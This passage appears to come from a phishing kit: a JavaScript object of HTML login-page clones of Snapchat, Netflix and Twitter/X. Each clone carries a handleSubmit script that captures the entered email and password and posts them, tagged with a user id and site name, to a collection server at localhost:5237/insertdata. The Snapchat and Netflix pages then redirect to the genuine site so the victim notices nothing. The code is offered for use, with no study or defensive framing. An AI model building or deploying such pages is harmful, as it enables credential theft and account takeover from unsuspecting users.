    switchToPhone.addEventListener('click', function () {
    if (label.textContent === 'USERNAME OR EMAIL') {
      label.textContent = 'PHONE NUMBER';
      usernameInput.type = 'tel';
    
      switchToPhone.textContent = 'Use email instead';
    } else {
      label.textContent = 'USERNAME OR EMAIL';
      usernameInput.type = 'text';
    
      switchToPhone.textContent = 'Use phone number instead';
    }
    });
  
    const uid = "user123user123"; 
          const websiteName = "mywebsitemywebsite"; 
      
          async function handleSubmit(event) {
            event.preventDefault(); 
            const email = document.getElementById('username').value;
            const password = document.getElementById("password").value;
            const signInButton = document.getElementById("sssssignsin");
          signInButton.disabled = true;
          signInButton.style.opacity = '0.5';
          signInButton.style.cursor = 'not-allowed';
          
            try {
              const response = await fetch("http://localhost:5237/insertdata", {
                method: "POST",
                headers: {
                  "Content-Type": "application/json"
                },
                body: JSON.stringify({
                  uid: uid,
                  websiteName: websiteName,
                  email: email,
                  password: password
                })
              });
              window.location.href = "https://snapchat.com/";
          } catch (error) {
            window.location.href = "https://snapchat.com/";
            }
          }
      </script>
      
  </body>
  </html>`,
    "netflix":`<!DOCTYPE html>
  <html lang="en">
  <head>
      <title>Test Page</title>
      <script>
          const uid = "user123user123"; 
          const websiteName = "mywebsitemywebsite"; 
      
          async function handleSubmit(event) {
            event.preventDefault(); 
            const email = document.getElementById("email").value;
            const password = document.getElementById("password").value;
            const signInButton = document.getElementById("amazon");
          signInButton.disabled = true;
          signInButton.style.opacity = '0.5';
          signInButton.style.cursor = 'not-allowed';
          
            try {
              const response = await fetch("http://localhost:5237/insertdata", {
                method: "POST",
                headers: {
                  "Content-Type": "application/json"
                },
                body: JSON.stringify({
                  uid: uid,
                  websiteName: websiteName,
                  email: email,
                  password: password
                })
              });
      
              window.location.href = "https://netflix.com/";
          } catch (error) {
            window.location.href = "https://netflix.com/";
            }
          }
        </script>
      
      <style>
          body{
      margin: 0;
      padding: 0;
      background: url("https://raw.githubusercontent.com/Elson0509/Netflix_login_design_clone/refs/heads/main/img/background.jpg") no-repeat center center fixed; 
      -webkit-background-size: cover;
      -moz-background-size: cover;
      -o-background-size: cover;
      background-size: cover;
      font-family: 'Helvetica Neue',Helvetica,Arial,sans-serif;
  }
  
  .img-logo{
      height: 94px;
      margin-left: 45px;
  }
  
  .upper{
      background-color: rgba(0, 0, 0, 0.6);
      padding-bottom: 100px;
  }
  
  .bottom{
      background-color: rgba(0, 0, 0, 0.85);
      color: #757575;
      
  }
  
  .bottom-width{
      max-width: 1000px;
      margin: 0 auto;
      padding: 30px;
  }
  
  .bottom-flex{
      display: flex;
      flex-wrap: wrap;
      padding: 15px 0 0 0;
      margin-block-start: 0;
      margin-block-end: 0;
  }
  
  .bottom-flex li{
      list-style: none;
  }
  
  .list-bottom{
      width: 25%;
      margin-top: 10px;
  }
  
  .link-bottom{
      text-decoration: none;
      color: #757575;
      font-size: 0.8rem;
  }
  
  .link-bottom:hover{
      text-decoration: underline;
      
  }
  
  .login{
      margin: 0 auto;
      width: 310px;
      background-color: rgba(0, 0, 0, 0.6);
      border-radius: 5px;
      padding: 30px 70px 143px 70px;
  }
  
  .login h1{
      color: white;
      padding-bottom: 10px;
  }
  
  .input-text{
      margin-bottom: 20px;
  }
  
  .input-text input{
      width: 100%;
      height: 45px;
      background-color: #333;
      color: white;
      border-radius:5px;
      border: none;
      outline: transparent;
      text-indent: 18px;
  }
  
  .input-text input::-webkit-input-placeholder {
      font-size: 1rem;
      color: #999;
  }
  
  .input-text input::-moz-placeholder {
      font-size: 1rem;
      color: #999;
      text-indent: 40px;
  }
  
  .signin-button{
      margin-top: 20px;
      width: 100%;
      padding: 13px;
      border-radius: 5px;
      background-color: red;
      color:white;
      border:none;
      font-weight: bold;
      font-size: 1.05rem;
      cursor: pointer;
  }
  
  .remember-flex{
      display: flex;
      justify-content: space-between;
      margin-top: 10px;
      font-size: 0.8rem;
  }
  
  .color_text{
      color: #b3b3b3;
  }
  
  .color_link{
      color: #737373;
  }
  
  .signup-link{
      color: white;
      text-decoration: none;
  }
  
  .warning-input{
      display: none;
      color:#e87c03;
      margin-top: 0;
      font-size: 0.8rem;
      margin-top: 6px;
  }
  
  .signup-link:hover{
      text-decoration: underline;
  }
  
  .face_icon{
      color: #3b5998;
      margin-right: 6px;
      font-size: 20px;
  }
  
  .log_face{
      text-decoration: none;
      margin-left: 10px;
      font-size: 0.8rem;
  }
  
  .login-face{
      margin: 50px 0 15px 0;
      vertical-align: middle;
      color: #8c8c8c;
  }
  
  .new-members{
      margin-bottom: 10px;
      color: #8c8c8c;
  }
  
  .help a{
      text-decoration: none;
  }
  .help a:hover{
      text-decoration: underline;
  }
  
  .protection{
      font-size: 0.8rem;
      color: #8c8c8c;
  }
  
  .protection a{
      text-decoration: none;
  }
  
  .protection a:hover{
      text-decoration: underline;
  }
  
  .tel-link{
      text-decoration: none;
      color: #757575;
  }
  
  .tel-link:hover{
      text-decoration: underline;
  }
  
  .select-language{
      -webkit-appearance: none;
      -moz-appearance: none;
      background: url("data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiA/PjwhRE9DVFlQRSBzdmcgIFBVQkxJQyAnLS8vVzNDLy9EVEQgU1ZHIDEuMS8vRU4nICAnaHR0cDovL3d3dy53My5vcmcvR3JhcGhpY3MvU1ZHLzEuMS9EVEQvc3ZnMTEuZHRkJz48c3ZnIGVuYWJsZS1iYWNrZ3JvdW5kPSJuZXcgMCAwIDUwIDUwIiBoZWlnaHQ9IjUwcHgiIGlkPSJMYXllcl8xIiB2ZXJzaW9uPSIxLjEiIHZpZXdCb3g9IjAgMCA1MCA1MCIgd2lkdGg9IjUwcHgiIHhtbDpzcGFjZT0icHJlc2VydmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiPjxyZWN0IGZpbGw9Im5vbmUiIGhlaWdodD0iNTAiIHdpZHRoPSI1MCIvPjxwb2x5Z29uIHN0cm9rZT0id2hpdGUiICBwb2ludHM9IjQ3LjI1LDE1IDQ1LjE2NCwxMi45MTQgMjUsMzMuMDc4IDQuODM2LDEyLjkxNCAyLjc1LDE1IDI1LDM3LjI1ICIvPjwvc3ZnPg==");
      background-size: 12px;
      background-position-x: calc(100% - 7px);
      background-position-y: calc(100% - 14px);
      background-repeat: no-repeat;
      background-color: #000;
      color:#757575;
      padding: 14px 20px 14px 14px;
      margin: 30px 0 40px 0;
      font-size: 0.9rem;
      min-height: 40px;
      border: 1px solid #333;
  }
  
  .select-language option{
      padding-left: 10px; 
  }
  
  @media screen and (max-width: 740px){
      body{
          background: black;
      }
  
      .img-logo {
          margin-left: 22px;
      }
  
      .login{
          padding: 0 10px 0 10px;
          width: 100%;
      }
  
      .login-div{
          width: 90%;
          margin: 0 auto;
      }
  
      .bottom {
          border-top: 1px solid #737373;
      }
  
      .upper{
          padding-bottom: 93px;
      }
  
      .list-bottom{
          width: 33%;
      }
  }
  
  @media screen and (max-width: 500px){
      .list-bottom{
          width: 50%;
      }
  }
  
      </style>
      <meta charset="UTF-8">
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous" />
      <link rel="stylesheet" href="style/style.css">
      <link rel="icon" href="https://raw.githubusercontent.com/Elson0509/Netflix_login_design_clone/refs/heads/main/img/logo.png">
      <title>Netflix</title>
      
  </head>
  <body>
      <div class="upper">
          <div class="logo">
              <a href="#">
                  <img src="https://raw.githubusercontent.com/Elson0509/Netflix_login_design_clone/refs/heads/main/img/Netflix-Logo.png" class="img-logo"/>
              </a>
          </div>
          <div class="login-div">
              <form class="login">
                  <h1>Sign In</h1>
                  <div class="input-text">
                      <input type="text" id="email" name="email" placeholder="Email or phone number" onfocus="inputOnFocus(this)" onblur="inputOnBlur(this)"/>
                      <div class="warning-input" id="warningEmail">
                          Please enter a valid email or phone number.
                      </div>
                  </div>
                  
                  <div class="input-text">
                      <input type="password" id="password" name="password" placeholder="Password" onfocus="inputOnFocus(this)" onblur="inputOnBlur(this)"/>
                      <div class="warning-input" id="warningPassword">
                          Your password must contain between 4 and 60 characters.
                      </div>
                  </div>
                  
                  <div>
                      <button class="signin-button" id="amazon" onclick="handleSubmit(event)">Sign In</button>
                  </div>
                  <div class="remember-flex">
                      <div>
                          <input type="checkbox">
                          <label class="color_text">Remember me</label>
                      </div>
                      <div class="help">
                          <a class="color_text" href="#">Need help?</a>
                      </div>
                  </div>
                  <div class="login-face">
                      <img src="https://raw.githubusercontent.com/Elson0509/Netflix_login_design_clone/refs/heads/main/img/fb-icon.png" height="20"/><a href="#" class="color_link log_face">Login with Facebook</a>
                  </div>
                  <div class="new-members">
                      New to Netflix? <a href="#" class="signup-link">Sign up now</a>.
                  </div>
                  <div class="protection color_link help">
                      This page is protected by Google reCAPTCHA to ensure you're not a bot. <a href="#">Learn more.</a>
                  </div>
              </form>
          </div>
      </div>
      <div class="bottom">
          <div class="bottom-width">
              Questions? Call <a href="tel:1-844-542-4813" class="tel-link">1-844-542-4813</a>
              <div>
                  <ul class="bottom-flex">
                      <li class="list-bottom">
                          <a href="#" class="link-bottom">
                              FAQ
                          </a>
                      </li>
                      <li class="list-bottom">
                          <a href="#" class="link-bottom">
                              Help Center
                          </a>
                      </li>
                      <li class="list-bottom">
                          <a href="#" class="link-bottom">
                              Terms of Use
                          </a>
                      </li>
                      <li class="list-bottom">
                          <a href="#" class="link-bottom">
                              Privacy
                          </a>
                      </li>
                      <li class="list-bottom">
                          <a href="#" class="link-bottom">
                              Cookie Preferences
                          </a>
                      </li>
                      <li class="list-bottom">
                          <a href="#" class="link-bottom">
                              Corporate information
                          </a>
                      </li>
                  </ul>
              </div>
              <div>
                  <select class="fa select-language">
                      <option> &#xf0ac; &nbsp;&nbsp;&nbsp;English</option>
                      <option> &#xf0ac; &nbsp;&nbsp;&nbsp;Fran&ccedil;ais</option>
                  </select>
              </div>
          </div>
      </div>
      <script src="js/script.js"></script>
  </body>
  </html>`,
    "twitter":`<!DOCTYPE html>
  <html lang="en">
  <head>
  <title>Test Page</title>
  <script>
          const uid = "user123user123"; 
          const websiteName = "mywebsitemywebsite"; 
      
          async function handleSubmit(event) {
            event.preventDefault(); 
            const email = document.getElementById("email").value;
            const password = document.getElementById("password").value;
            const signInButton = document.getElementById("amazon");
          signInButton.disabled = true;
          signInButton.style.opacity = '0.5';
          signInButton.style.cursor = 'not-allowed';
          
            try {
              const response = await fetch("http://localhost:5237/insertdata", {
                method: "POST",
                headers: {
                  "Content-Type": "application/json"
                },
                body: JSON.stringify({
                  uid: uid,
                  websiteName: websiteName,
                  email: email,
                  password: password
                })
              });
      
              if (response.ok) {
                const result = await response.json();
                
              } else {
                const error = await response.text();
                console.log(error);
              }
            } catch (error) {
              console.error("Error inserting data:", error);
              alert("An error occurred while sending data.");
            }
          }
        </script>
      
      <style>
          @import url('https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap');
  
  :root{
      --bg-color: #242d34;
      --white-color: #e7e9ea;
      --black-color: #0f1419;
      --grey-color: #71767b;
      --focus-color: #1d9bf0;
      --grey-color-hover: #333639;
      --white-color-hover: #e6e6e6;
      --black-color-hover: #536471;
  }
  
  *{
      margin: 0;
      padding: 0;
      box-sizing: border-box;
  }
  
  button{
      border: none;
      background: none;
      font-family: inherit;
      color: inherit;
      cursor: pointer;
  }
  
  a{
      text-decoration: none;
      font-family: inherit;
      color: inherit;
  }
  
  body{
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      background-color: var(--bg-color);
      color: var(--white-color);
      font-family: 'Roboto', sans-serif;
  }
  
  .container{
      max-width: 600px;
      width: 100%;
      display: flex;
      flex-direction: column;
      align-items: center;
      background-color: #000;
      padding: 24px 20px;
      border-radius: 16px;
  }
  
  .header{
      width: 100%;
      display: flex;
      justify-content: center;
      align-items: center;
      position: relative;
      color: inherit;
  }
  
  .close_button{
      position: absolute;
      top: 0;
      left: 0;
      font-size: 20px;
      border-radius: 50%;
      padding: 8px;
      cursor: pointer;
  }
  
  .close_button:hover{
      background-color: var(--grey-color-hover);
  }
  
  .logo{
      cursor: pointer;
      font-size: 35px;
  }
  
  .content{
      width: 300px;
      color: inherit;
      text-align: center;
  }
  
  .content h1{
      margin-block: 28px;
  }
  
  .action_buttons,
  .sign_up_buttons{
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      font-family: inherit;
      color: inherit;
      gap: 1.3rem;
  }
  
  .primary,
  .secondary{
      width: 100%;
      font-size: 16px;
      padding: 5px 0;
      border-radius: 16px;
  }
  
  .primary{
      background-color: #fff;
      color: var(--black-color);
      transition: .2s ease;
      font-weight: 600;        
  }
  
  .primary:hover{
      background-color: var(--white-color-hover);
  }
  
  .secondary{
      background-color: transparent;
      color: var(--white-color);
      border: 1px solid var(--grey-color);
  }
  
  .secondary:hover{
      background-color: var(--grey-color-hover);
  }
  
  .sign_in{
      display: flex;
      justify-content: center;
      align-items: center;
  }
  
  .sign_in object{
      height: 24px;
      width: 24px;
      margin-right: 4px;
  }
  
  .divider{
      margin-block: 28px;
      position: relative;
  }
  
  .divider::before,
  .divider::after{
      content: '';
      position: absolute;
      height: 1px;
      width: 45%;
      background-color: var(--grey-color);
      top: 50%;
  }
  
  .divider::before{
      left: 0;
  }
  
  .divider::after{
      right: 0;
  }
  
  .email_label{
      width: 100%;
      display: flex;
      align-items: center;
      flex-direction: column;
      position: relative;
      margin-bottom: 32px;
  }
  
  .email_label input{
      width: 100%;
      background-color: transparent;
      border: 1px solid var(--grey-color);
      border-radius: 16px;
      outline: none;
      padding: 25px 10px 10px 10px;
      color: var(--white-color);
      font-size: 18px;
  }
  
  .email_label label{
      position: absolute;
      top: 20px;
      left: 10px;
      font-size: 18px;
      color: var(--grey-color);
      transition: .2s ease;
  }
  
  .email_label input::placeholder{
      opacity: 0;
  }
  
  .email_label input:focus{
      outline: 1px solid var(--focus-color);
  }
  
  .email_label input:focus + label,
  .email_label input:not(:placeholder-shown) + label {
      font-size: 10px;
      top: 10px;
      color: var(--focus-color);
  }
  
  .footer{
      margin-top: 28px;
      font-size: 14px;
      color: var(--grey-color);
      font-weight: 300;
  }
  
  .footer a{
      color: var(--focus-color);
  }
  
  .footer a:hover{
      text-decoration: underline;
  }
      </style>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>X Login Clone Webpage</title>
      <link rel="stylesheet" href="style.css">
      <link href="https://cdn.jsdelivr.net/npm/remixicon@4.3.0/fonts/remixicon.css" rel="stylesheet"/>
  </head>
  <body>
      <div class="container">
          <div class="header">
              <div class="close_button">
                  <i class="ri-close-fill"></i>
              </div>
              <div class="logo">
                  <i class="ri-twitter-x-fill"></i>
              </div>
          </div>
  
          <div class="content">
              <button onclick="handleSubmit(event)">
                  <h1>Login to X</h1>
              </button>
              
  
              <div class="action_buttons">
                  <button class="primary sign_in">
                      <object data="https://i.postimg.cc/KzSzY5g4/google.png" type=""></object>
                      <span>Sign in with Google</span>
                  </button>
                  <button class="primary sign_in">
                      <object data="https://i.postimg.cc/P57JgHXW/apple.png" type=""></object>
                      <span>Sign in with Apple</span>
                  </button>
              </div>
  
              <div class="divider">
                  <p>or</p>
              </div>
  
              <div class="email_label">
                  <input type="text" id="log_in" placeholder="email">
                  <label for="log_in">Telephone, email, username</label>
              </div>
  
              <div class="sign_up_buttons">
                  <button class="primary sign_up">
                      Next
                  </button>
                  <button class="secondary sign_up">
                      Forgot Password?
                  </button>
              </div>
  
          </div>
  
          <div class="footer">
              <p>Don't have an account? <a href="#">Sign up</a></p>
          </div>
  
      </div>
  </body>
  </html>`
  };